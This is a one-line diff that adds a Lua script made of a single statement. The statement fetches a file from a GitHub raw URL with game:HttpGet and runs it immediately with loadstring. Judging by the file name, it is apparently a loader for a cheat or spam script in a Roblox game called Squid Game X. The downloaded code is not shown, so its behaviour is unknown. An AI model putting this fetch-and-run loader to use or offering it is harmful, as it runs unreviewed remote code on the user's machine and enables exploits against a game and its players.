@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/codefinchpalace/loaders/main/loaders/squid-game-x-spam7-sb56bmmgo1hzyp.lua"))()
